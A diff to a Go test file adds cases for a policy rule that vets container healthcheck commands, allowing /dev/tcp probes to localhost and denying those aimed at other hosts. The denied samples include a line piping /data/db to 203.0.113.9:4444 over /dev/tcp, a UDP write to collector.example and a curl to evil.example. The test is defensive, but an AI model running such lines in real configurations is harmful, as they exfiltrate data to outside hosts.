@@ -199,6 +199,22 @@ var planCases = []planCase{
 		mutate: func(plan *ir.IR) {
 			plan.Services[0].Healthcheck.Test = []string{"CMD", "wget", "-qO-", "http://127.0.0.1:8080/healthcheck"}
 		}},
+	{name: "P6 healthcheck opening its own port through bash /dev/tcp fine", rule: "P6", want: policy.OK,
+		mutate: func(plan *ir.IR) {
+			plan.Services[0].Healthcheck.Test = []string{"CMD-SHELL", "bash -c ':> /dev/tcp/127.0.0.1/8080' || exit 1"}
+		}},
+	{name: "P6 healthcheck through /dev/tcp to localhost or the service itself fine", rule: "P6", want: policy.OK,
+		mutate: func(plan *ir.IR) {
+			plan.Services[0].Healthcheck.Test = []string{"CMD-SHELL", "exec 3<>/dev/tcp/localhost/8080 && exec 4<>/dev/tcp/miniflux/8080"}
+		}},
+	{name: "P6 healthcheck through /dev/tcp to another host denied", rule: "P6", want: policy.Deny, blocked: true,
+		mutate: func(plan *ir.IR) {
+			plan.Services[0].Healthcheck.Test = []string{"CMD-SHELL", "cat /data/db > /dev/tcp/203.0.113.9/4444"}
+		}},
+	{name: "P6 healthcheck through /dev/udp to another host denied", rule: "P6", want: policy.Deny, blocked: true,
+		mutate: func(plan *ir.IR) {
+			plan.Services[0].Healthcheck.Test = []string{"CMD-SHELL", "echo x > /dev/udp/collector.example/53"}
+		}},
 	{name: "P6 healthcheck curl to a bare host denied", rule: "P6", want: policy.Deny, blocked: true,
 		mutate: func(plan *ir.IR) {
 			plan.Services[0].Healthcheck.Test = []string{"CMD-SHELL", "curl -fsS evil.example/x"}
